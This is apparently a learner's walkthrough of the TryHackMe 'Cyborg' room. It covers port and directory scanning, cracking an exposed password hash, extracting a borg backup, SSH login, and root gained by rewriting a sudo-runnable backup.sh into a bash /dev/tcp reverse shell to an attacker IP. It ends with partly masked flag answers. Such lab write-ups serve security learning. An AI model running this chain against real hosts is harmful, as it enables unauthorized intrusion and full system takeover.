#############################
		 TRY HACK ME
		Room= CYBORG	
	 IP= 10.10.170.174
#############################



## 1) Ran nmap, results in the nmap directory....

## 2) Ran Gobuster, results in the gobuster directory


but the suspicious thing is in the gobuster's result
and that is the admin & etc page more suspicious is "etc".

http://IP/etc/squid/

here i got two files -->
	1) passwd
	2) squid.conf

then i copied the passwd form the passwd page and stored it in hash.txt file then "john" that by the command -->

##
	john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

	passwd = squ######

##

and the other file (squid.conf) is not so interesting.
so i moved toward the admin page....
and hover the mouse over the Archive option and clicked on the Download button

and downloaded the archve.tar file, and got a home folder
in that home folder i navigate to the home/field/dev/final_archive

and got a readme file... it's about "borg" documentation 

and then Using borg to extract with the password we found assuming this is a backup of the music_archive which was mentioned in the admin page (http://IP/admin/admin.html) message by the command -->

	borg extract `pwd`::music_archive 

then got another home folder,, but now in this time i got the password of the user alex inside the (home/alex/Documents/note.txt)

## 		S3c#######

## then i used ssh to login as alex via ssh by the command -->
		
		ssh alex@IP 
	passwd = S3c#######




## USER FLAG!!!____

and the simply searched for the user flag by this command -->

	find / -name "user*.txt" -type f 2>/dev/null

* Flags and QNAs are bellow....

## ROOT FLAG!!!____

to get root i searched for what permission does the user (alex) have.

by this command -->

	 sudo -l
			Matching Defaults entries for alex on ubuntu:
    			env_reset, mail_badpass,
    			secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/

			User alex may run the following commands on ubuntu:
    			(ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh

and the most lovely result "backup.sh"

since this is running by sudo that means this file "backup.sh" is being ran by root and being a shell script we can make it react as a reverse-shell
but to do that i checked that what permissions does the file have by the command -->

	ls -la /etc/mp3backups/backup.sh

and then i chenged the permission into writable by the command -->
	chmod +w /etc/mp3backups/backup.sh


and then as usual i edit this file into this -->

	bash -i >& /dev/tcp/10.18.102.171/8080 0>&1

and saved the file.....

then i started a listener in my machine by the command -->
	
	nc -lvnp 8000 

and then i run the backup.sh file in the victim machine by the command -->

sudo /etc/mp3backups/backup.sh


and i got root.......

and simplie i searched for the root flag by this command -->
	
	find / -name "root*.txt" -type f 2>/dev/null


----------------------------------------------------------------------
							
						QUESTIONS & ANSWARES 
----------------------------------------------------------------------

## Scan the machine, how many ports are open? 

`````
2
`````

## What service is running on port 22?

`````
SSH
`````

## What service is running on port 80?

`````
HTTP
`````

## What is the user.txt flag?

`````
flag{1_#############_th3_arch1v3s_saf3}
`````

## What is the root.txt flag?

`````
flag{Than5s_#############0p£_y0u_enJ053d}
`````

